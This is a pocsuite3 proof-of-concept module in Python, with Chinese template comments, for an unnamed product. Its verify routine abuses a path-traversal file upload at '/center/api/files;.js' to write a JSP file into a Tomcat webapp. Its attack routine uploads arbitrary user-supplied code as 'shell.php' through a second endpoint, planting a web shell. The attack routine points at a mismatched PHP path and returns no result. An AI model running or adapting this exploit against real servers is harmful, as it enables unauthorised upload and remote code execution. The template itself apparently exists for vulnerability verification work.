from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-09'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-09'  # 编写 PoC 的日期
    updateDate = '2023-08-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE


    def _verify(self):
        result = {}
        path = "/center/api/files;.js"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Content-Type': 'multipart/form-data; boundary=cf9e10955673d739125ea3d19fdcf4f0',

        }
        url = self.url + path
        payload =f"""--cf9e10955673d739125ea3d19fdcf4f0\r
Content-Disposition:form-data;name="file";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/vulntest.jsp"\r
Content-Type: image/png\r
\r
<% out.println(new java.io.File(application.getRealPath(request.getServletPath())));new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r
--cf9e10955673d739125ea3d19fdcf4f0--\r\n"""
        try:
            resq = requests.post(url=url,headers=headers,data=payload,timeout=5,verify=False)
            resq_results=requests.get(url=self.url+'/clusterMgr/vulntest.jsp;.js',verify=False)
            if "bin\\tomcat\\apache-tomcat\\webapps\\clusterMgr\\vulntest.jsp" in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['shell'] = self.url+'/clusterMgr/vulntest.jsp;.js'
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        code = self.get_option("code")
        path = "/php/addmediadata.php"
        headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ'}
        url = self.url + path
        data=f'''
------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/plain

{code}

------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="subpath"


------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="fullpath"

../php
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'''
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
            print('File Path >>> ' + f'{self.url}/php/shell.php')
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)